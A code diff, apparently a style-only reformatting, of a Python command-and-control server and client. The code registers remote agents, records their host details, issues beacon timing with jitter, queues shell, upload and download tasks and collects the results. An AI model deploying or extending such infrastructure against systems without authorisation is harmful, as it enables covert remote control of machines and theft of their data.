@@ -50,10 +50,10 @@ class C2Server:
         self.app = web.Application()
         self._setup_routes()
         self.active_connections: Dict[str, Any] = {}
-        
+
         # Command queue for each session
         self.command_queues: Dict[str, asyncio.Queue] = {}
-        
+
         # Response storage
         self.responses: Dict[str, Dict[str, Any]] = {}
 
@@ -64,7 +64,7 @@ class C2Server:
         self.app.router.add_post("/register", self.handle_register)
         self.app.router.add_get("/tasks/{session_id}", self.handle_get_tasks)
         self.app.router.add_post("/results/{session_id}", self.handle_post_results)
-        
+
         # Operator/CLI endpoints
         self.app.router.add_get("/health", self.handle_health)
         self.app.router.add_post("/api/command", self.handle_api_queue_command)
@@ -78,31 +78,33 @@ class C2Server:
     async def handle_beacon(self, request: web.Request) -> web.Response:
         """
         Handle agent beacon.
-        
+
         Agents send periodic beacons to maintain connection.
         """
         try:
             data = await request.json()
             session_id = data.get("session_id")
-            
+
             if not session_id:
                 return web.json_response({"error": "Missing session_id"}, status=400)
-            
+
             # Update session last seen
             session = self.session_manager.get_session(session_id)
             if session:
                 session.update_last_seen()
                 self.session_manager.save_session(session)
                 logger.info(f"Beacon received from session {session_id}")
-                
-                return web.json_response({
-                    "status": "ok",
-                    "timestamp": datetime.now().isoformat(),
-                    "has_tasks": session_id in self.command_queues and not self.command_queues[session_id].empty()
-                })
+
+                return web.json_response(
+                    {
+                        "status": "ok",
+                        "timestamp": datetime.now().isoformat(),
+                        "has_tasks": session_id in self.command_queues and not self.command_queues[session_id].empty(),
+                    }
+                )
             else:
                 return web.json_response({"error": "Session not found"}, status=404)
-                
+
         except Exception as e:
             logger.error(f"Error handling beacon: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -110,49 +112,50 @@ class C2Server:
     async def handle_register(self, request: web.Request) -> web.Response:
         """
         Handle agent registration.
-        
+
         New agents register themselves and receive a session ID.
         """
         try:
             data = await request.json()
-            
+
             # Extract agent information
             hostname = data.get("hostname", "unknown")
             username = data.get("username", "unknown")
             os_info = data.get("os", "unknown")
             ip_address = request.remote
-            
+
             # Create session
             metadata = {
                 "hostname": hostname,
                 "username": username,
                 "os": os_info,
                 "ip_address": ip_address,
-                "registered_at": datetime.now().isoformat()
+                "registered_at": datetime.now().isoformat(),
             }
-            
+
             session = self.session_manager.create_session(
-                target=ip_address,
-                protocol="https",
-                encryption="aes256-gcm",
-                metadata=metadata
+                target=ip_address, protocol="https", encryption="aes256-gcm", metadata=metadata
             )
-            
+
             session.status = SessionStatus.ACTIVE
             self.session_manager.update_session(session.id, status=SessionStatus.ACTIVE)
-            
+
             # Initialize command queue
             self.command_queues[session.id] = asyncio.Queue()
-            
+
             logger.info(f"New agent registered: {session.id} from {ip_address}")
-            
-            return web.json_response({
-                "session_id": session.id,
-                "encryption_key": self.encryption_key.hex() if isinstance(self.encryption_key, bytes) else self.encryption_key,
-                "beacon_interval": 60,  # seconds
-                "jitter": 30  # seconds
-            })
-            
+
+            return web.json_response(
+                {
+                    "session_id": session.id,
+                    "encryption_key": (
+                        self.encryption_key.hex() if isinstance(self.encryption_key, bytes) else self.encryption_key
+                    ),
+                    "beacon_interval": 60,  # seconds
+                    "jitter": 30,  # seconds
+                }
+            )
+
         except Exception as e:
             logger.error(f"Error handling registration: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -160,20 +163,20 @@ class C2Server:
     async def handle_get_tasks(self, request: web.Request) -> web.Response:
         """
         Handle agent requesting tasks.
-        
+
         Returns pending commands for the agent to execute.
         """
         try:
             session_id = request.match_info["session_id"]
-            
+
             session = self.session_manager.get_session(session_id)
             if not session:
                 return web.json_response({"error": "Session not found"}, status=404)
-            
+
             # Update last seen
             session.update_last_seen()
             self.session_manager.save_session(session)
-            
+
             # Get tasks from queue
             tasks = []
             if session_id in self.command_queues:
@@ -185,12 +188,9 @@ class C2Server:
                         tasks.append(task)
                 except asyncio.TimeoutError:
                     pass
-            
-            return web.json_response({
-                "tasks": tasks,
-                "timestamp": datetime.now().isoformat()
-            })
-            
+
+            return web.json_response({"tasks": tasks, "timestamp": datetime.now().isoformat()})
+
         except Exception as e:
             logger.error(f"Error getting tasks: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -202,28 +202,28 @@ class C2Server:
         try:
             session_id = request.match_info["session_id"]
             data = await request.json()
-            
+
             session = self.session_manager.get_session(session_id)
             if not session:
                 return web.json_response({"error": "Session not found"}, status=404)
-            
+
             # Store results
             task_id = data.get("task_id")
             if task_id:
                 if session_id not in self.responses:
                     self.responses[session_id] = {}
-                
+
                 self.responses[session_id][task_id] = {
                     "output": data.get("output"),
                     "error": data.get("error"),
                     "exit_code": data.get("exit_code", 0),
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 }
-                
+
                 logger.info(f"Received results for task {task_id} from session {session_id}")
-            
+
             return web.json_response({"status": "ok"})
-            
+
         except Exception as e:
             logger.error(f"Error handling results: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -231,7 +231,7 @@ class C2Server:
     async def handle_api_queue_command(self, request: web.Request) -> web.Response:
         """
         API endpoint for operator to queue commands.
-        
+
         Used by CLI tools to send commands to agents.
         """
         try:
@@ -239,46 +239,38 @@ class C2Server:
             session_id = data.get("session_id")
             command = data.get("command")
             command_type = data.get("type", "execute")
-            
+
             if not session_id or not command:
                 return web.json_response({"error": "Missing session_id or command"}, status=400)
-            
+
             # Verify session exists
             session = self.session_manager.get_session(session_id)
             if not session:
                 return web.json_response({"error": "Session not found"}, status=404)
-            
+
             # Generate task ID
             import time
+
             task_id = f"task_{int(time.time() * 1000)}"
-            
+
             # Queue the command
             if session_id not in self.command_queues:
                 self.command_queues[session_id] = asyncio.Queue()
-            
-            task = {
-                "id": task_id,
-                "type": command_type,
-                "command": command,
-                "timestamp": datetime.now().isoformat()
-            }
-            
+
+            task = {"id": task_id, "type": command_type, "command": command, "timestamp": datetime.now().isoformat()}
+
             if command_type == "upload":
                 task["remote_path"] = data.get("remote_path")
                 task["data"] = data.get("data")
                 task["filename"] = data.get("filename")
             elif command_type == "download":
                 task["path"] = data.get("path")
-            
+
             await self.command_queues[session_id].put(task)
             logger.info(f"API: Queued {command_type} command for session {session_id}")
-            
-            return web.json_response({
-                "status": "ok",
-                "task_id": task_id,
-                "session_id": session_id
-            })
-            
+
+            return web.json_response({"status": "ok", "task_id": task_id, "session_id": session_id})
+
         except Exception as e:
             logger.error(f"Error in API queue command: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -290,19 +282,14 @@ class C2Server:
         try:
             session_id = request.match_info["session_id"]
             task_id = request.match_info["task_id"]
-            
+
             # Check if result is ready
             if session_id in self.responses and task_id in self.responses[session_id]:
                 result = self.responses[session_id][task_id]
-                return web.json_response({
-                    "status": "completed",
-                    "result": result
-                })
+                return web.json_response({"status": "completed", "result": result})
             else:
-                return web.json_response({
-                    "status": "pending"
-                }, status=404)
-                
+                return web.json_response({"status": "pending"}, status=404)
+
         except Exception as e:
             logger.error(f"Error in API get result: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -313,16 +300,16 @@ class C2Server:
         """
         try:
             status_filter = request.query.get("status", "all")
-            
+
             all_sessions = self.session_manager.list_sessions()
-            
+
             if status_filter == "active":
                 sessions = [s for s in all_sessions if s.status == SessionStatus.ACTIVE]
             elif status_filter == "inactive":
                 sessions = [s for s in all_sessions if s.status == SessionStatus.INACTIVE]
             else:
                 sessions = all_sessions
-            
+
             session_data = [
                 {
                     "session_id": s.session_id,
@@ -331,13 +318,13 @@ class C2Server:
                     "os": s.metadata.get("os", "unknown"),
                     "status": s.status.value,
                     "last_seen": s.last_seen.isoformat() if s.last_seen else None,
-                    "created_at": s.created_at.isoformat()
+                    "created_at": s.created_at.isoformat(),
                 }
                 for s in sessions
             ]
-            
+
             return web.json_response({"sessions": session_data})
-            
+
         except Exception as e:
             logger.error(f"Error in API list sessions: {e}")
             return web.json_response({"error": str(e)}, status=500)
@@ -345,53 +332,48 @@ class C2Server:
     async def queue_command(self, session_id: str, command: str, task_id: Optional[str] = None) -> str:
         """
         Queue a command for an agent to execute.
-        
+
         Args:
             session_id: Target session ID
             command: Command to execute
             task_id: Optional task ID (generated if not provided)
-            
+
         Returns:
             Task ID
         """
         if session_id not in self.command_queues:
             self.command_queues[session_id] = asyncio.Queue()
-        
+
         if not task_id:
             task_id = f"task_{datetime.now().timestamp()}"
-        
-        task = {
-            "id": task_id,
-            "type": "execute",
-            "command": command,
-            "timestamp": datetime.now().isoformat()
-        }
-        
+
+        task = {"id": task_id, "type": "execute", "command": command, "timestamp": datetime.now().isoformat()}
+
         await self.command_queues[session_id].put(task)
         logger.info(f"Queued command for session {session_id}: {command}")
-        
+
         return task_id
 
     async def get_command_result(self, session_id: str, task_id: str, timeout: int = 30) -> Optional[Dict[str, Any]]:
         """
         Wait for and retrieve command result.
-        
+
         Args:
             session_id: Session ID
             task_id: Task ID
             timeout: Timeout in seconds
-            
+
         Returns:
             Command result or None if timeout
         """
         start_time = asyncio.get_event_loop().time()
-        
+
         while asyncio.get_event_loop().time() - start_time < timeout:
             if session_id in self.responses and task_id in self.responses[session_id]:
                 return self.responses[session_id][task_id]
-            
+
             await asyncio.sleep(1)
-        
+
         return None
 
     async def start(self) -> None:
@@ -415,7 +397,7 @@ class C2Client:
     def __init__(self, server_url: str, encryption_key: Optional[bytes] = None) -> None:
         """
         Initialize C2 client.
-        
+
         Args:
             server_url: C2 server URL
             encryption_key: Encryption key
@@ -423,20 +405,15 @@ class C2Client:
         self.server_url = server_url.rstrip("/")
         self.encryption_key = encryption_key
 
-    async def send_command(
-        self,
-        session_id: str,
-        command: str,
-        timeout: int = 30
-    ) -> Dict[str, Any]:
+    async def send_command(self, session_id: str, command: str, timeout: int = 30) -> Dict[str, Any]:
         """
         Send command to agent via C2 server.
-        
+
         Args:
             session_id: Target session ID
             command: Command to execute
             timeout: Command timeout
-            
+
         Returns:
             Command result
         """
